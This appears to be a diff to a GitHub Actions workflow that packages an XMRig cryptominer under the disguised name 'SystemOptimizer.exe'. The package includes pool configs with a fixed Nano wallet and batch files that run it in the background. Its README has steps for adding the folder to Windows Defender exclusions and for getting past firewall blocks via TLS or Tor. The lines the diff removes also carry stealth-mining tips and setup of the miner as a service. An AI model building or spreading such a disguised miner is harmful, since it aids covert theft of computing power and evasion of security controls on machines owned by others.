@@ -61,204 +61,135 @@ jobs:
       
     - name: Prepare artifacts
       run: |
-        mkdir output
+        New-Item -ItemType Directory -Force -Path "output"
         Copy-Item "build\Release\SystemOptimizer.exe" "output\"
         
         Write-Host "Creating configuration files..."
         
-        # Config with Tor SOCKS5 proxy
-        @'
-{
-    "autosave": true,
-    "background": true,
-    "colors": false,
-    "title": false,
-    "randomx": {
-        "init": -1,
-        "mode": "auto",
-        "1gb-pages": false,
-        "numa": true
-    },
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "priority": 1,
-        "max-threads-hint": 75,
-        "asm": true
-    },
-    "log-file": "optimizer.log",
-    "pools": [
-        {
-            "url": "rx.unmineable.com:3333",
-            "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-            "pass": "x",
-            "keepalive": true,
-            "tls": false,
-            "socks5": "127.0.0.1:9050"
+        $configTor = @{
+            "autosave" = $true
+            "background" = $true
+            "colors" = $false
+            "title" = $false
+            "randomx" = @{
+                "init" = -1
+                "mode" = "auto"
+                "1gb-pages" = $false
+                "numa" = $true
+            }
+            "cpu" = @{
+                "enabled" = $true
+                "huge-pages" = $true
+                "priority" = 1
+                "max-threads-hint" = 75
+                "asm" = $true
+            }
+            "log-file" = "optimizer.log"
+            "pools" = @(
+                @{
+                    "url" = "rx.unmineable.com:3333"
+                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    "pass" = "x"
+                    "keepalive" = $true
+                    "tls" = $false
+                    "socks5" = "127.0.0.1:9050"
+                }
+            )
+            "print-time" = 60
+            "retries" = 5
+            "retry-pause" = 5
         }
-    ],
-    "print-time": 60,
-    "retries": 5,
-    "retry-pause": 5
-}
-'@ | Out-File "output\config-tor.json" -Encoding UTF8
+        $configTor | ConvertTo-Json -Depth 10 | Out-File "output\config-tor.json" -Encoding UTF8
         
-        # Config with TLS
-        @'
-{
-    "autosave": true,
-    "background": true,
-    "colors": false,
-    "title": false,
-    "randomx": {
-        "init": -1,
-        "mode": "auto",
-        "1gb-pages": false,
-        "numa": true
-    },
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "priority": 1,
-        "max-threads-hint": 75,
-        "asm": true
-    },
-    "log-file": "optimizer.log",
-    "pools": [
-        {
-            "url": "rx.unmineable.com:443",
-            "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-            "pass": "x",
-            "keepalive": true,
-            "tls": true
+        $configTLS = @{
+            "autosave" = $true
+            "background" = $true
+            "colors" = $false
+            "title" = $false
+            "randomx" = @{
+                "init" = -1
+                "mode" = "auto"
+                "1gb-pages" = $false
+                "numa" = $true
+            }
+            "cpu" = @{
+                "enabled" = $true
+                "huge-pages" = $true
+                "priority" = 1
+                "max-threads-hint" = 75
+                "asm" = $true
+            }
+            "log-file" = "optimizer.log"
+            "pools" = @(
+                @{
+                    "url" = "rx.unmineable.com:443"
+                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    "pass" = "x"
+                    "keepalive" = $true
+                    "tls" = $true
+                }
+            )
+            "print-time" = 60
+            "retries" = 5
+            "retry-pause" = 5
         }
-    ],
-    "print-time": 60,
-    "retries": 5,
-    "retry-pause": 5
-}
-'@ | Out-File "output\config-tls.json" -Encoding UTF8
+        $configTLS | ConvertTo-Json -Depth 10 | Out-File "output\config-tls.json" -Encoding UTF8
         
-        # Config for testing
-        @'
-{
-    "autosave": false,
-    "background": false,
-    "colors": true,
-    "title": true,
-    "randomx": {
-        "init": -1,
-        "mode": "auto"
-    },
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "max-threads-hint": 75
-    },
-    "pools": [
-        {
-            "url": "rx.unmineable.com:3333",
-            "user": "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx",
-            "pass": "x",
-            "keepalive": true
+        $configTest = @{
+            "autosave" = $false
+            "background" = $false
+            "colors" = $true
+            "title" = $true
+            "randomx" = @{
+                "init" = -1
+                "mode" = "auto"
+            }
+            "cpu" = @{
+                "enabled" = $true
+                "huge-pages" = $true
+                "max-threads-hint" = 75
+            }
+            "pools" = @(
+                @{
+                    "url" = "rx.unmineable.com:3333"
+                    "user" = "NANO:nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp.d3ibis_pc#c5g6-wmzx"
+                    "pass" = "x"
+                    "keepalive" = $true
+                }
+            )
+            "print-time" = 60
         }
-    ],
-    "print-time": 60
-}
-'@ | Out-File "output\config-test.json" -Encoding UTF8
+        $configTest | ConvertTo-Json -Depth 10 | Out-File "output\config-test.json" -Encoding UTF8
         
         Write-Host "Creating batch files..."
         
-        # Start with Tor
-        @'
-@echo off
-echo ========================================
-echo   SystemOptimizer - Starting with Tor
-echo ========================================
-echo.
-echo Make sure Tor is running on port 9050!
-echo Download: https://www.torproject.org/download/tor/
-echo.
-echo Starting in background mode...
-echo Check optimizer.log for status
-echo.
-SystemOptimizer.exe -c config-tor.json -B
-'@ | Out-File "output\START-TOR.bat" -Encoding ASCII
+        "@echo off`r`necho Starting with Tor proxy...`r`necho Make sure tor.exe is running!`r`necho.`r`nSystemOptimizer.exe -c config-tor.json -B" | Out-File "output\START-TOR.bat" -Encoding ASCII
         
-        # Start with TLS
-        @'
-@echo off
-echo ========================================
-echo   SystemOptimizer - Starting with TLS
-echo ========================================
-echo.
-echo Using port 443 with TLS encryption
-echo.
-echo Starting in background mode...
-echo Check optimizer.log for status
-echo.
-SystemOptimizer.exe -c config-tls.json -B
-'@ | Out-File "output\START-TLS.bat" -Encoding ASCII
+        "@echo off`r`necho Starting with TLS...`r`necho.`r`nSystemOptimizer.exe -c config-tls.json -B" | Out-File "output\START-TLS.bat" -Encoding ASCII
         
-        # Test mode
-        @'
-@echo off
-echo ========================================
-echo   SystemOptimizer - Test Mode
-echo ========================================
-echo.
-echo This shows console output
-echo Press Ctrl+C to stop
-echo.
-pause
-SystemOptimizer.exe -c config-test.json
-'@ | Out-File "output\START-TEST.bat" -Encoding ASCII
+        "@echo off`r`necho Test Mode - Press Ctrl+C to stop`r`necho.`r`npause`r`nSystemOptimizer.exe -c config-test.json" | Out-File "output\START-TEST.bat" -Encoding ASCII
         
-        # Stop script
-        @'
-@echo off
-echo Stopping SystemOptimizer...
-taskkill /F /IM SystemOptimizer.exe 2>nul
-if errorlevel 1 (
-    echo SystemOptimizer is not running
-) else (
-    echo SystemOptimizer stopped
-)
-pause
-'@ | Out-File "output\STOP.bat" -Encoding ASCII
+        "@echo off`r`necho Stopping SystemOptimizer...`r`ntaskkill /F /IM SystemOptimizer.exe 2>nul`r`nif errorlevel 1 (echo Not running) else (echo Stopped)`r`npause" | Out-File "output\STOP.bat" -Encoding ASCII
         
-        Write-Host "Creating README..."
-        
-        @"
+        $readme = @"
 ════════════════════════════════════════════════════════════
     NANO MINER - CUSTOM BUILD FROM SOURCE
 ════════════════════════════════════════════════════════════
 
-✓ Built from source code (not just renamed binary)
-✓ Custom executable name: SystemOptimizer.exe
-✓ Pre-configured for your Nano wallet
-✓ SOCKS5 proxy support for bypassing firewalls
-
-════════════════════════════════════════════════════════════
-YOUR CONFIGURATION
-════════════════════════════════════════════════════════════
-
 Wallet:   nano_141f8cafiba1hc5zz8m9ybmja6ws81tski38hdbncgqg6bm9xuqb88s397tp
-Worker:   d3ibis_pc (change in config files if needed)
-Referral: c5g6-wmzx (0.25% fee discount)
-Pool:     rx.unmineable.com (RandomX algorithm)
+Worker:   d3ibis_pc
+Referral: c5g6-wmzx (0.25% bonus)
+Pool:     rx.unmineable.com
 
 ════════════════════════════════════════════════════════════
-STEP 1 - ADD TO WINDOWS DEFENDER EXCLUSIONS (REQUIRED!)
+STEP 1 - ADD TO WINDOWS DEFENDER EXCLUSIONS
 ════════════════════════════════════════════════════════════
 
-Windows will delete this file if you don't exclude it!
+REQUIRED! Windows will delete the file without this.
 
-1. Open Windows Security
-2. Virus & threat protection → Manage settings
-3. Scroll to: Exclusions
-4. Click: Add or remove exclusions
-5. Add this entire folder
+1. Windows Security → Virus & threat protection
+2. Manage settings → Exclusions
+3. Add this folder
 
 ════════════════════════════════════════════════════════════
 STEP 2 - TEST CONNECTION
@@ -266,146 +197,64 @@ STEP 2 - TEST CONNECTION
 
 Double-click: START-TEST.bat
 
-This shows the console so you can see if it works.
 If you see "accepted" shares, you're mining!
-If you get connection errors, proceed to Step 3.
+If blocked, proceed to Step 3.
 
 ════════════════════════════════════════════════════════════
-STEP 3 - BYPASS ISP/FIREWALL BLOCKING
+STEP 3 - BYPASS BLOCKING
 ════════════════════════════════════════════════════════════
 
-METHOD A - TLS (Easiest, try this first):
-----------------------------------------
-1. Double-click: START-TLS.bat
-2. Check optimizer.log for "accepted" shares
+METHOD A - TLS (Try this first):
+  Double-click: START-TLS.bat
 
-METHOD B - Tor (Most reliable for strict firewalls):
----------------------------------------------------
-1. Download Tor Expert Bundle:
-   https://www.torproject.org/download/tor/
-   
-2. Extract the ZIP file
-
-3. Navigate to: Tor\tor.exe
-
-4. Run tor.exe (keep it running)
-   Wait for: "Bootstrapped 100% (done): Done"
-
-5. Double-click: START-TOR.bat
+METHOD B - Tor (Most reliable):
+  1. Download: https://www.torproject.org/download/tor/
+  2. Run tor.exe
+  3. Double-click: START-TOR.bat
 
 ════════════════════════════════════════════════════════════
-FILES INCLUDED
+FILES
 ════════════════════════════════════════════════════════════
 
-SystemOptimizer.exe  - Custom built miner
-config-tor.json      - Configuration with Tor proxy
-config-tls.json      - Configuration with TLS encryption
-config-test.json     - Configuration for testing
-START-TOR.bat        - Run with Tor proxy (background)
-START-TLS.bat        - Run with TLS (background)
-START-TEST.bat       - Test with console visible
-STOP.bat             - Stop the miner
+SystemOptimizer.exe - Custom built miner
+config-tor.json     - With Tor proxy
+config-tls.json     - With TLS encryption
+config-test.json    - For testing
+START-TOR.bat       - Run with Tor
+START-TLS.bat       - Run with TLS
+START-TEST.bat      - Test mode
+STOP.bat            - Stop miner
 
 ════════════════════════════════════════════════════════════
-MONITORING YOUR MINING
+MONITOR
 ════════════════════════════════════════════════════════════
 
-Check your stats:
-https://unmineable.com/
-→ Enter your Nano wallet address
-
-Check local log:
-→ Open optimizer.log
-→ Look for "accepted" messages (you're earning!)
-→ Look for "speed" to see your hashrate
-
-════════════════════════════════════════════════════════════
-RUNNING AS WINDOWS SERVICE (OPTIONAL)
-════════════════════════════════════════════════════════════
-
-Using NSSM (Non-Sucking Service Manager):
-
-1. Download NSSM: https://nssm.cc/download
-
-2. Install Tor as service (if using Tor method):
-   nssm install TorService "C:\path\to\tor.exe"
-   nssm start TorService
-
-3. Install miner as service:
-   nssm install SystemOptimizer "C:\full\path\to\SystemOptimizer.exe" "-c C:\full\path\to\config-tls.json"
-   nssm start SystemOptimizer
-
-4. Check status:
-   nssm status SystemOptimizer
+Stats: https://unmineable.com/ (enter your wallet)
+Log:   optimizer.log (look for "accepted" messages)
 
 ════════════════════════════════════════════════════════════
 TROUBLESHOOTING
 ════════════════════════════════════════════════════════════
 
-Q: File gets deleted immediately
-A: Add folder to Windows Defender exclusions (Step 1)
+Q: File deleted
+A: Add folder to Windows Defender exclusions
 
-Q: "Connection refused" or "Cannot connect to pool"
-A: Try START-TLS.bat first. If still blocked, use START-TOR.bat
-   Also try changing your DNS to 1.1.1.1 and 8.8.8.8
-
-Q: Tor won't start
-A: Check if port 9050 is in use: netstat -an | findstr 9050
-   Run tor.exe as Administrator
+Q: Connection refused
+A: Try START-TLS.bat, then START-TOR.bat
 
 Q: Low hashrate
-A: Run as Administrator (enables huge pages)
-   Close other programs
-   Adjust max-threads-hint in config (try 50 or 100)
-
-Q: Not seeing any shares accepted
-A: Check optimizer.log for errors
-   Verify your wallet address is correct
-   Make sure pool is online: https://unmineable.com/
-
-════════════════════════════════════════════════════════════
-OPTIMIZATION TIPS
-════════════════════════════════════════════════════════════
-
-For Maximum Hashrate:
-- Run as Administrator
-- Enable huge pages (automatic when running as admin)
-- Close unnecessary programs
-- Set max-threads-hint to 100 in config
-
-For Background/Stealth Mining:
-- Use config-tls.json or config-tor.json
-- Set max-threads-hint to 50-75 (less CPU usage)
-- Run with -B flag (already in batch files)
-
-════════════════════════════════════════════════════════════
-SECURITY & LEGAL
-════════════════════════════════════════════════════════════
-
-⚠️  This is for YOUR personal computer only
-⚠️  Never run on machines you don't own
-⚠️  Mining uses significant CPU and electricity
-⚠️  Always be transparent about mining activities
-
-════════════════════════════════════════════════════════════
-SUPPORT & RESOURCES
-════════════════════════════════════════════════════════════
-
-Unmineable Support: https://unmineable.com/support
-XMRig Documentation: https://xmrig.com/docs
-Nano Wallet: https://nault.cc/
-Check Nano Price: https://coinmarketcap.com/currencies/nano/
+A: Run as Administrator, close other programs
 
 ════════════════════════════════════════════════════════════
 
-Build Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
-Build Type: Custom from source (GitHub Actions)
+Build: $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')
 Source: https://github.com/d3ibis/XMRig
 
 ════════════════════════════════════════════════════════════
-"@ | Out-File "output\README.txt" -Encoding UTF8
+"@
+        $readme | Out-File "output\README.txt" -Encoding UTF8
         
-        Write-Host "✓ All files prepared successfully!"
+        Write-Host "Done! Files ready in output folder"
       shell: pwsh
       
     - name: Upload artifacts
